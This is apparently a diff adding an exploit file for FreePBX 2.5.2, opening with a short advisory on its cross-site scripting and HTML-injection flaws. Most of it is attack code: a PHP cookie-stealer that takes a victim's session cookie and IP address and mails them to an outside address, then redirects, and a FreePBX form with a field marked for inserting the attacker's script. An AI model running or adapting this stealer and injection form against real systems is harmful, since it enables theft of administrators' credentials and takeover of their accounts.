@@ -1,0 +1,33 @@
+source: http://www.securityfocus.com/bid/37482/info
+ 
+FreePBX is prone to a cross-site scripting vulnerability and multiple HTML-injection vulnerabilities because it fails to properly sanitize user-supplied input before using it in dynamically generated content.
+ 
+Attacker-supplied HTML and script code would run in the context of the affected browser, potentially allowing the attacker to steal cookie-based authentication credentials or to control how the site is rendered to the user. Other attacks are also possible.
+ 
+FreePBX 2.5.2 is vulnerable; other versions may also be affected. 
+
+<?
+$cookie = $_GET['nice'];
+$ip = getenv("REMOTE_ADDR");
+$Time = date("l dS of F Y h:i:s A");
+$msg = "Cookie: $cookie\nIP Address: $ip\Time: $Time";
+$subject = "cookie";
+mail("notification@global-evolution.info", $subject, $msg);
+header ("location: http://127.0.0.1:8080/admin/");
+?>
+
+
+<form name="editZapchandid" action="" method="post" onsubmit="return checkZapchandid(editZapchandid);">
+<input type="hidden" name="extdisplay" value="">
+<input type="hidden" name="channel" value="">
+<input type="hidden" name="action" value="add">
+<table><tr><td colspan="2"><h5>Add Channel<hr></h5></td></tr>
+<tr><td><a href="#" class="info">Channel:<span>The Zap Channel number to map to a DID</span></a></td>
+<td><input size="5" type="text" name="channel" value="" tabindex="1"></td>
+</tr><tr><td><a href="#" class="info">Description:<span>A useful description describing this channel</span></a></td>
+<td><input size="40" type="text" name="description" value="INSERT 0WN SCRIPTCODE HERE!!!" tabindex="2"></td>
+</tr><tr><td><a href="#" class="info">DID:<span>The DID that this channel represents. The incoming call on this channel
+will be treated as if it came in with this DID and can be managed with Inbound Routing on DIDs</span></a></td>
+<td><input size="40" type="text" name="did" value="" tabindex="3"/></td>
+</tr><tr><td colspan="2"><br><input name="Submit" type="submit" value="Submit Changes" tabindex="4">
+</td></tr></table></form>
